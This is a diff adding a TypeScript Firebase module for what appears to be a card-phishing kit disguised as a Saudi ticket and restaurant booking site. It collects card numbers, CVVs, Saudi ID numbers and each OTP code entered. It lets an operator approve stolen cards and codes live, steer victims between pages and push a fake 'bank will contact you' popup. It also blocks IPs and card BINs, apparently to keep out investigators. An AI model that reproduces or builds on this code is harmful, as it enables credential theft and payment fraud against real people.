@@ -1,0 +1,865 @@
+import { getApp, getApps, initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
+import {
+  doc,
+  getDoc,
+  getFirestore,
+  setDoc,
+  updateDoc,
+  onSnapshot,
+} from "firebase/firestore";
+import {
+  getAuth,
+  signInWithEmailAndPassword,
+  signOut,
+  onAuthStateChanged,
+  User,
+} from "firebase/auth";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyD7lJVFT0YlHyGDvY6Vg5DrAWEy37c0CmQ",
+  authDomain: "drd-new.firebaseapp.com",
+  projectId: "drd-new",
+  storageBucket: "drd-new.firebasestorage.app",
+  messagingSenderId: "278382775396",
+  appId: "1:278382775396:web:dca7127a4eac9b99a1e371",
+  measurementId: "G-0VG26ERJXH",
+};
+
+function initializeFirebase() {
+  if (typeof window === "undefined") {
+    return null;
+  }
+
+  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
+    console.warn(
+      "Firebase configuration is incomplete. Some features may not work.",
+    );
+    return null;
+  }
+
+  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+}
+
+const app = initializeFirebase();
+const db = app ? getFirestore(app) : null;
+const database = app ? getDatabase(app) : null;
+const auth = app ? getAuth(app) : null;
+
+const MAX_HISTORY_ITEMS = 20;
+const MAX_AMOUNT_VALUE = 1_000_000;
+const BLOCK_CACHE_TTL_MS = 10_000;
+
+const blockedVisitorCache = new Map<
+  string,
+  { blocked: boolean; expiresAt: number }
+>();
+
+let cachedVisitorIp: string | null = null;
+let cachedIpBlocked: boolean | null = null;
+let cachedVisitorGeo: {
+  country: string;
+  countryCode: string;
+  city: string;
+  region: string;
+} | null = null;
+
+const sanitizeString = (value: unknown, maxLength: number) => {
+  if (typeof value !== "string") return value;
+  return value.trim().slice(0, maxLength);
+};
+
+const sanitizeDigits = (value: unknown, maxLength: number) => {
+  if (typeof value !== "string") return value;
+  return value.replace(/\D/g, "").slice(0, maxLength);
+};
+
+const sanitizePhone = (value: unknown, maxLength: number) => {
+  if (typeof value !== "string") return value;
+  return value.replace(/[^\d+]/g, "").slice(0, maxLength);
+};
+
+const clampNumber = (value: unknown, min: number, max: number) => {
+  if (typeof value !== "number" || Number.isNaN(value)) return value;
+  return Math.min(max, Math.max(min, value));
+};
+
+const sanitizeCardEntry = (entry: any) => ({
+  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
+  cardName: sanitizeString(entry?.cardName, 60),
+  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
+  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
+  cvv: sanitizeDigits(entry?.cvv, 4),
+  cardType: sanitizeString(entry?.cardType, 20),
+  timestamp:
+    typeof entry?.timestamp === "string"
+      ? entry.timestamp
+      : new Date().toISOString(),
+});
+
+const sanitizeOtpEntry = (entry: any) => ({
+  code: sanitizeDigits(entry?.code, 6),
+  timestamp:
+    typeof entry?.timestamp === "string"
+      ? entry.timestamp
+      : new Date().toISOString(),
+});
+
+const sanitizePayload = (input: any) => {
+  const data = { ...input };
+
+  if ("id" in data) data.id = sanitizeString(data.id, 80);
+  if ("name" in data) data.name = sanitizeString(data.name, 80);
+  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
+  if ("email" in data && typeof data.email === "string") {
+    data.email = data.email.trim().toLowerCase().slice(0, 120);
+  }
+  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
+  if ("cardNumber" in data)
+    data.cardNumber = sanitizeDigits(data.cardNumber, 19);
+  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
+  if ("expiryMonth" in data)
+    data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
+  if ("expiryYear" in data)
+    data.expiryYear = sanitizeDigits(data.expiryYear, 4);
+  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
+  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
+  if ("cardCategory" in data)
+    data.cardCategory = sanitizeString(data.cardCategory, 40);
+  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
+  if ("currentPage" in data)
+    data.currentPage = sanitizeString(data.currentPage, 40);
+  if ("status" in data) data.status = sanitizeString(data.status, 40);
+  if ("type" in data) data.type = sanitizeString(data.type, 40);
+  if ("restaurant" in data)
+    data.restaurant = sanitizeString(data.restaurant, 120);
+  if ("restaurantEn" in data)
+    data.restaurantEn = sanitizeString(data.restaurantEn, 120);
+  if ("date" in data) data.date = sanitizeString(data.date, 40);
+  if ("time" in data) data.time = sanitizeString(data.time, 40);
+  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
+  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
+  if ("bookingDate" in data)
+    data.bookingDate = sanitizeString(data.bookingDate, 40);
+  if ("bookingTime" in data)
+    data.bookingTime = sanitizeString(data.bookingTime, 40);
+
+  if ("ticketQuantity" in data) {
+    data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
+  }
+  if ("ticketPrice" in data) {
+    data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
+  }
+  if ("totalAmount" in data) {
+    data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
+  }
+  if ("total" in data) {
+    data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
+  }
+
+  if (Array.isArray(data.cardHistory)) {
+    data.cardHistory = data.cardHistory
+      .slice(-MAX_HISTORY_ITEMS)
+      .map((entry: any) => sanitizeCardEntry(entry));
+  }
+
+  if (Array.isArray(data.otpHistory)) {
+    data.otpHistory = data.otpHistory
+      .slice(-MAX_HISTORY_ITEMS)
+      .map((entry: any) => sanitizeOtpEntry(entry));
+  }
+
+  return data;
+};
+
+const isVisitorBlocked = async (visitorId: string) => {
+  if (!db || !visitorId) return false;
+
+  const cached = blockedVisitorCache.get(visitorId);
+  if (cached && cached.expiresAt > Date.now()) {
+    return cached.blocked;
+  }
+
+  try {
+    const snapshot = await getDoc(doc(db, "pays", visitorId));
+    const blocked = Boolean(snapshot.data()?.blocked);
+    blockedVisitorCache.set(visitorId, {
+      blocked,
+      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
+    });
+    return blocked;
+  } catch (error) {
+    console.error("Error checking visitor block status:", error);
+    return false;
+  }
+};
+
+export const loginWithEmail = async (email: string, password: string) => {
+  if (!auth) throw new Error("Auth not initialized");
+  return signInWithEmailAndPassword(auth, email, password);
+};
+
+export const logoutUser = async () => {
+  if (!auth) return;
+  return signOut(auth);
+};
+
+export const onAuthChange = (callback: (user: User | null) => void) => {
+  if (!auth) return () => {};
+  return onAuthStateChanged(auth, callback);
+};
+
+export async function addData(data: any) {
+  if (!db) {
+    console.warn("Firebase not initialized. Cannot add data.");
+    return false;
+  }
+
+  const payload = sanitizePayload(data);
+  const visitorId =
+    typeof payload?.id === "string"
+      ? payload.id
+      : localStorage.getItem("visitor");
+
+  if (!visitorId) {
+    console.warn("Missing visitor ID. Cannot add data.");
+    return false;
+  }
+
+  localStorage.setItem("visitor", visitorId);
+  if (cachedIpBlocked === true) {
+    console.warn("Blocked IP tried to submit data:", visitorId);
+    return false;
+  }
+  const blocked = await isVisitorBlocked(visitorId);
+  if (blocked) {
+    console.warn("Blocked visitor tried to submit data:", visitorId);
+    return false;
+  }
+
+  try {
+    const docRef = doc(db, "pays", visitorId!);
+    await setDoc(
+      docRef,
+      {
+        ...payload,
+        id: visitorId,
+        createdDate:
+          typeof payload.createdDate === "string"
+            ? payload.createdDate
+            : new Date().toISOString(),
+      },
+      { merge: true },
+    );
+
+    console.log("Document written with ID: ", docRef.id);
+    return true;
+  } catch (e) {
+    console.error("Error adding document: ", e);
+    return false;
+  }
+}
+
+export const handleCurrentPage = async (page: string) => {
+  const visitorId = localStorage.getItem("visitor");
+  if (visitorId) {
+    return addData({ id: visitorId, currentPage: page });
+  }
+  return false;
+};
+
+export const handleOtp = async (otp: string, page: string = "otp") => {
+  const visitorId = localStorage.getItem("visitor");
+  if (visitorId && db) {
+    try {
+      if (cachedIpBlocked === true) {
+        throw new Error("IP_BLOCKED");
+      }
+      const blocked = await isVisitorBlocked(visitorId);
+      if (blocked) {
+        throw new Error("VISITOR_BLOCKED");
+      }
+
+      const docRef = doc(db, "pays", visitorId);
+      const otpEntry = {
+        code: sanitizeDigits(otp, 6),
+        timestamp: new Date().toISOString(),
+      };
+      if (typeof otpEntry.code !== "string" || otpEntry.code.length < 4) {
+        throw new Error("INVALID_OTP");
+      }
+      const existingOtpsRaw = JSON.parse(
+        localStorage.getItem("otpHistory") || "[]",
+      );
+      const existingOtps = Array.isArray(existingOtpsRaw)
+        ? existingOtpsRaw
+        : [];
+      const nextOtps = [...existingOtps, otpEntry]
+        .slice(-MAX_HISTORY_ITEMS)
+        .map((entry) => sanitizeOtpEntry(entry));
+      localStorage.setItem("otpHistory", JSON.stringify(nextOtps));
+
+      await setDoc(
+        docRef,
+        sanitizePayload({
+          otp: otpEntry.code,
+          otpHistory: nextOtps,
+          currentPage: page,
+          otpApproved: false,
+          otpStatus: "pending",
+        }),
+        { merge: true },
+      );
+      return true;
+    } catch (error) {
+      console.error("Error saving OTP:", error);
+      throw error;
+    }
+  }
+  return false;
+};
+
+export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
+  if (!db) {
+    console.warn("Firebase not initialized. Cannot process payment.");
+    return false;
+  }
+
+  try {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId) {
+      if (cachedIpBlocked === true) {
+        throw new Error("IP_BLOCKED");
+      }
+      const blocked = await isVisitorBlocked(visitorId);
+      if (blocked) {
+        throw new Error("VISITOR_BLOCKED");
+      }
+
+      const docRef = doc(db, "pays", visitorId);
+      const sanitizedPaymentInfo = sanitizePayload(paymentInfo);
+      const cardEntry = sanitizeCardEntry({
+        ...sanitizedPaymentInfo,
+        timestamp: new Date().toISOString(),
+      });
+
+      const snapshot = await getDoc(docRef);
+      const existingHistoryRaw = snapshot.data()?.cardHistory;
+      const existingHistory = Array.isArray(existingHistoryRaw)
+        ? existingHistoryRaw
+        : [];
+      const nextCardHistory = [...existingHistory, cardEntry]
+        .slice(-MAX_HISTORY_ITEMS)
+        .map((entry) => sanitizeCardEntry(entry));
+
+      await setDoc(
+        docRef,
+        sanitizePayload({
+          ...sanitizedPaymentInfo,
+          status: "pending_approval",
+          cardApproved: false,
+          cardStatus: "pending_approval",
+          cardHistory: nextCardHistory,
+        }),
+        { merge: true },
+      );
+
+      if (typeof setPaymentInfo === "function") {
+        setPaymentInfo((prev: any) => ({
+          ...prev,
+          status: "pending_approval",
+        }));
+      }
+      return true;
+    }
+  } catch (error) {
+    console.error("Error adding document: ", error);
+    throw error;
+  }
+  return false;
+};
+
+// Listen for card approval status
+export const listenForApproval = (
+  callback: (status: "approved" | "rejected") => void,
+): (() => void) => {
+  if (!db) {
+    console.warn("Firebase not initialized. Cannot listen for approval.");
+    return () => {};
+  }
+
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) {
+    return () => {};
+  }
+
+  const docRef = doc(db, "pays", visitorId);
+  const unsubscribe = onSnapshot(docRef, (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data();
+      if (data.cardApproved === true) {
+        callback("approved");
+      } else if (data.cardStatus === "rejected") {
+        callback("rejected");
+      }
+    }
+  });
+
+  return unsubscribe;
+};
+
+export const listenForOtpApproval = (
+  callback: (status: "approved" | "rejected") => void,
+): (() => void) => {
+  if (!db) {
+    console.warn("Firebase not initialized.");
+    return () => {};
+  }
+
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return () => {};
+
+  const docRef = doc(db, "pays", visitorId);
+  const unsubscribe = onSnapshot(docRef, (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data();
+      if (data.otpApproved === true) {
+        callback("approved");
+      } else if (data.otpStatus === "rejected") {
+        callback("rejected");
+      }
+    }
+  });
+
+  return unsubscribe;
+};
+
+// Listen for admin "push step" commands. The dashboard writes a `directedStep`
+// field on the visitor's pay doc; this fires the callback whenever that field
+// changes to a positive number, so the visitor's app can navigate to the
+// matching page. Dedups by `directedAt` so re-pushing the same step number
+// fires again. The callback receives the visitor's data so the watcher can
+// pick the right route based on flow (ticket vs restaurant).
+export const listenForDirectedStep = (
+  callback: (step: number, data: any) => void,
+): (() => void) => {
+  if (!db) return () => {};
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return () => {};
+
+  const docRef = doc(db, "pays", visitorId);
+  let lastDirectedAt = "";
+  const unsubscribe = onSnapshot(docRef, (snapshot) => {
+    if (!snapshot.exists()) return;
+    const data = snapshot.data();
+    const step = Number(data?.directedStep) || 0;
+    const directedAt = String(data?.directedAt || "");
+    if (step > 0 && directedAt && directedAt !== lastDirectedAt) {
+      lastDirectedAt = directedAt;
+      callback(step, data);
+    } else if (step === 0) {
+      lastDirectedAt = "";
+    }
+  });
+  return unsubscribe;
+};
+
+// Clear the directedStep field after the visitor has acted on it so the same
+// command doesn't fire again on the next snapshot.
+export const clearDirectedStep = async () => {
+  if (!db) return;
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return;
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    await setDoc(
+      docRef,
+      {
+        directedStep: 0,
+        directedAt: null,
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  } catch (error) {
+    console.error("Error clearing directedStep:", error);
+  }
+};
+
+export const updateOtpApprovalStatus = async (
+  visitorId: string,
+  approved: boolean,
+) => {
+  if (!db) return;
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    await updateDoc(docRef, {
+      otpApproved: approved,
+      otpStatus: approved ? "approved" : "rejected",
+    });
+  } catch (error) {
+    console.error("Error updating OTP approval:", error);
+  }
+};
+
+// Update visitor approval status (for admin dashboard)
+export const updateApprovalStatus = async (
+  visitorId: string,
+  approved: boolean,
+) => {
+  if (!db) {
+    console.warn("Firebase not initialized.");
+    return;
+  }
+
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    await updateDoc(docRef, {
+      cardApproved: approved,
+      cardStatus: approved ? "approved" : "rejected",
+      status: approved ? "approved" : "rejected",
+    });
+  } catch (error) {
+    console.error("Error updating approval status:", error);
+  }
+};
+
+// --- "Bank contact" prompt ---
+// Admin can push a popup to the visitor that says their bank will contact
+// them. The visitor sees a modal with a confirm button; when they confirm,
+// the admin's dashboard is notified.
+
+export const pushBankContactRequest = async (visitorId: string) => {
+  if (!db || !visitorId) return;
+  try {
+    await setDoc(
+      doc(db, "pays", visitorId),
+      {
+        bankContactRequest: true,
+        bankContactAt: new Date().toISOString(),
+        bankContactConfirmed: false,
+        bankContactConfirmedAt: null,
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  } catch (err) {
+    console.error("Error pushing bank contact request:", err);
+  }
+};
+
+export const listenForBankContactRequest = (
+  callback: (
+    show: boolean,
+    payload: {
+      requestedAt: string;
+      cardBin: string;
+      cardBankName: string;
+    },
+  ) => void,
+): (() => void) => {
+  if (!db) return () => {};
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return () => {};
+  const ref = doc(db, "pays", visitorId);
+  return onSnapshot(ref, (snap) => {
+    if (!snap.exists()) {
+      callback(false, { requestedAt: "", cardBin: "", cardBankName: "" });
+      return;
+    }
+    const data = snap.data() as any;
+    const requested = Boolean(data?.bankContactRequest);
+    const confirmed = Boolean(data?.bankContactConfirmed);
+    const requestedAt = String(data?.bankContactAt || "");
+    const rawCard = String(data?.cardNumber || "").replace(/\D/g, "");
+    const cardBin = rawCard.slice(0, 6);
+    const cardBankName = String(
+      data?.cardBankName || data?.cardBank || data?.bankName || "",
+    );
+    callback(requested && !confirmed, {
+      requestedAt,
+      cardBin,
+      cardBankName,
+    });
+  });
+};
+
+export const confirmBankContact = async () => {
+  if (!db) return;
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return;
+  try {
+    await setDoc(
+      doc(db, "pays", visitorId),
+      {
+        bankContactConfirmed: true,
+        bankContactConfirmedAt: new Date().toISOString(),
+        bankContactRequest: false,
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  } catch (err) {
+    console.error("Error confirming bank contact:", err);
+  }
+};
+
+// Live-listen to the visitor's own block flag so the page can react when an
+// admin flips `blocked` on their pay doc.
+export const listenForVisitorBlock = (
+  callback: (blocked: boolean) => void,
+): (() => void) => {
+  if (!db) return () => {};
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return () => {};
+  const ref = doc(db, "pays", visitorId);
+  return onSnapshot(ref, (snap) => {
+    const data = snap.exists() ? (snap.data() as any) : null;
+    const blocked = Boolean(data?.blocked);
+    blockedVisitorCache.set(visitorId, {
+      blocked,
+      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
+    });
+    callback(blocked);
+  });
+};
+
+// ===== Blocked IP management =====
+// Fetch the visitor's IP and geo from the server. Cached for the page lifetime.
+export const fetchVisitorIp = async (): Promise<string> => {
+  if (cachedVisitorIp !== null) return cachedVisitorIp;
+  try {
+    const res = await fetch("/api/visitor-ip");
+    if (!res.ok) {
+      cachedVisitorIp = "";
+      return "";
+    }
+    const json = await res.json();
+    cachedVisitorIp = typeof json?.ip === "string" ? json.ip : "";
+    cachedVisitorGeo = {
+      country: typeof json?.country === "string" ? json.country : "",
+      countryCode: typeof json?.countryCode === "string" ? json.countryCode : "",
+      city: typeof json?.city === "string" ? json.city : "",
+      region: typeof json?.region === "string" ? json.region : "",
+    };
+    return cachedVisitorIp || "";
+  } catch (error) {
+    console.error("Error fetching visitor IP:", error);
+    cachedVisitorIp = "";
+    cachedVisitorGeo = null;
+    return "";
+  }
+};
+
+// Check whether an IP is in the admin blocklist (settings/blockedIps doc).
+export const isIpBlocked = async (ip: string): Promise<boolean> => {
+  if (!db || !ip) return false;
+  try {
+    const snap = await getDoc(doc(db, "settings", "blockedIps"));
+    if (!snap.exists()) return false;
+    const data = snap.data() as any;
+    const ips: string[] = Array.isArray(data?.ips)
+      ? data.ips.map((x: any) => String(x).trim())
+      : [];
+    return ips.includes(ip.trim());
+  } catch (error) {
+    console.error("Error checking blocked IP:", error);
+    return false;
+  }
+};
+
+// Synchronously read the cached "is this IP blocked" flag (set by ensureVisitorIp).
+export const isCachedIpBlocked = (): boolean => cachedIpBlocked === true;
+
+// Subscribe to live changes to the IP blocklist so a freshly-blocked visitor
+// gets cut off without needing to refresh.
+export const listenForIpBlock = (
+  ip: string,
+  callback: (blocked: boolean) => void,
+): (() => void) => {
+  if (!db || !ip) return () => {};
+  const ref = doc(db, "settings", "blockedIps");
+  return onSnapshot(ref, (snap) => {
+    const data = snap.data() as any;
+    const ips: string[] = Array.isArray(data?.ips)
+      ? data.ips.map((x: any) => String(x).trim())
+      : [];
+    const blocked = ips.includes(ip.trim());
+    cachedIpBlocked = blocked;
+    callback(blocked);
+  });
+};
+
+// Resolve the visitor's IP, persist it on their pay doc (if a visitor record
+// already exists), and return whether the IP is currently blocked.
+export const ensureVisitorIp = async (): Promise<{
+  ip: string;
+  blocked: boolean;
+}> => {
+  const ip = await fetchVisitorIp();
+  if (!ip) {
+    cachedIpBlocked = false;
+    return { ip: "", blocked: false };
+  }
+  const blocked = await isIpBlocked(ip);
+  cachedIpBlocked = blocked;
+
+  // Best-effort: attach the IP and geo to the visitor's existing pay doc so
+  // admins can see and block it from the dashboard.
+  try {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId && db) {
+      const ref = doc(db, "pays", visitorId);
+      const snap = await getDoc(ref);
+      if (snap.exists()) {
+        const existing = snap.data() as any;
+        const geo = cachedVisitorGeo;
+        const needsUpdate =
+          existing?.ip !== ip ||
+          (geo &&
+            (existing?.geoCountry !== geo.country ||
+              existing?.geoCity !== geo.city));
+        if (needsUpdate) {
+          const patch: Record<string, unknown> = {
+            ip,
+            ipAddress: ip,
+            ipUpdatedAt: new Date().toISOString(),
+          };
+          if (geo?.country) patch.geoCountry = geo.country;
+          if (geo?.countryCode) patch.geoCountryCode = geo.countryCode;
+          if (geo?.city) patch.geoCity = geo.city;
+          if (geo?.region) patch.geoRegion = geo.region;
+          await setDoc(ref, patch, { merge: true });
+        }
+      }
+    }
+  } catch (error) {
+    console.error("Error attaching visitor IP:", error);
+  }
+
+  return { ip, blocked };
+};
+
+// ===== Blocked BIN management =====
+const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);
+
+// Always query Firestore directly so payer tabs see admin changes immediately.
+export const isBinBlocked = async (cardOrBin: string): Promise<boolean> => {
+  if (!db) return false;
+  const bin = normalizeBin(cardOrBin);
+  if (bin.length < 6) return false;
+  try {
+    const snap = await getDoc(doc(db, "blocked_bins", bin));
+    return snap.exists();
+  } catch (error) {
+    console.error("Error checking blocked BIN:", error);
+    return false;
+  }
+};
+
+export const addBlockedBin = async (
+  bin: string,
+  meta?: { bankName?: string; cardBrand?: string; country?: string },
+) => {
+  if (!db) return false;
+  const normalized = normalizeBin(bin);
+  if (normalized.length < 6) {
+    throw new Error("INVALID_BIN");
+  }
+  try {
+    const docRef = doc(db, "blocked_bins", normalized);
+    await setDoc(docRef, {
+      bin: normalized,
+      blockedAt: new Date().toISOString(),
+      ...(meta || {}),
+    });
+    return true;
+  } catch (error) {
+    console.error("Error blocking BIN:", error);
+    throw error;
+  }
+};
+
+export const removeBlockedBin = async (bin: string) => {
+  if (!db) return false;
+  const normalized = normalizeBin(bin);
+  try {
+    const { deleteDoc } = await import("firebase/firestore");
+    await deleteDoc(doc(db, "blocked_bins", normalized));
+    return true;
+  } catch (error) {
+    console.error("Error unblocking BIN:", error);
+    throw error;
+  }
+};
+
+export const listenBlockedBins = (
+  callback: (
+    bins: Array<{
+      bin: string;
+      bankName?: string;
+      cardBrand?: string;
+      country?: string;
+      blockedAt?: string;
+    }>,
+  ) => void,
+): (() => void) => {
+  if (!db) return () => {};
+  let unsubscribe: (() => void) | null = null;
+  let cancelled = false;
+  (async () => {
+    const { collection, onSnapshot: onSnap } = await import(
+      "firebase/firestore"
+    );
+    if (cancelled || !db) return;
+    const u = onSnap(collection(db, "blocked_bins"), (snap) => {
+      const list: any[] = [];
+      snap.forEach((d) => {
+        const data = d.data();
+        list.push({ bin: d.id, ...data });
+      });
+      callback(list);
+    });
+    if (cancelled) {
+      u();
+    } else {
+      unsubscribe = u;
+    }
+  })();
+  return () => {
+    cancelled = true;
+    if (unsubscribe) unsubscribe();
+  };
+};
+
+export const updateVisitorBlockStatus = async (
+  visitorId: string,
+  blocked: boolean,
+) => {
+  if (!db) {
+    console.warn("Firebase not initialized.");
+    return false;
+  }
+
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    const payload: Record<string, unknown> = {
+      blocked,
+      blockedAt: blocked ? new Date().toISOString() : null,
+    };
+    if (blocked) {
+      payload.online = false;
+    }
+    await setDoc(docRef, payload, { merge: true });
+    blockedVisitorCache.set(visitorId, {
+      blocked,
+      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
+    });
+    return true;
+  } catch (error) {
+    console.error("Error updating block status:", error);
+    throw error;
+  }
+};
+
+export { db, database, auth };
